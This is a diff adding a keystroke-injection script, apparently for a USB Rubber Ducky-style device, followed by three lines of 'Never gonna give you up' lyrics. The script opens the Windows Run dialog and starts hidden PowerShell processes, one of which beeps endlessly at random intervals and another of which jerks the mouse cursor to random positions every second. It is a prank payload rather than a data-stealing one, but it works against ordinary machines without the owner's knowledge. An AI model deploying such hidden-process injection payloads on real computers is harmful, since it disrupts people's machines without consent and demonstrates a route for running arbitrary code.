@@ -1,0 +1,13 @@
+DELAY 500
+GUI r
+DELAY 750
+STRING powershell -w h -c "Start-Process powershell -ArgumentList '-w hidden -c \"while ($true) { $beep = [char]7; echo $beep; Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 10000) }\"' -WindowStyle Hidden"
+ENTER
+DELAY 500
+GUI r
+DELAY 750
+STRING powershell -w h -c "Add-Type -assemblyName System.Windows.Forms;$a=@(1..1000);while(1){[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(($a|get-random),($a|get-random));start-sleep -seconds 1}"
+ENTER
+01 Never gonna give you up
+02 Never gonna let you down
+03 Never gonna run around
